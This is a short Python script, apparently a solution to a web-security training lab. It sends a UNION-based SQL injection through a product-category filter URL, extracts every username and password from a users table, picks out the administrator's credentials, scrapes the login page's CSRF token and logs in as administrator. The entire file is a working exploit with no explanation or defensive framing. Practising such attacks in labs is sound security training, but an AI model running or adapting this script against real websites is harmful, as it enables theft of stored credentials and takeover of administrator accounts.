import requests
from bs4 import BeautifulSoup


def unionAttack(url):
    url1 = url + "filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,%20username%20||%20%27*%27%20||%20password%20FROM%20users--"
    url2 = url + "login"
    session = requests.session()
    resp = session.get(url1).text
    licznik = resp.index("administrator")
    str = ""
    while (True):
        if resp[licznik] != '<':
            str += resp[licznik]
            licznik = licznik + 1
        else:
            break
    login = str[0:str.index('*')]
    password = str[str.index('*') + 1:len(str)]
    session = requests.session()
    resp2 = session.get(url2).text
    soup = BeautifulSoup(resp2, "html.parser")
    csrf = soup.find('input', {'name': 'csrf'})['value']
    response = session.post(url2, data={"username": login, "password": password, "csrf": csrf})
    if "logout" in response.text:
        return 1;
    else:
        return 0;

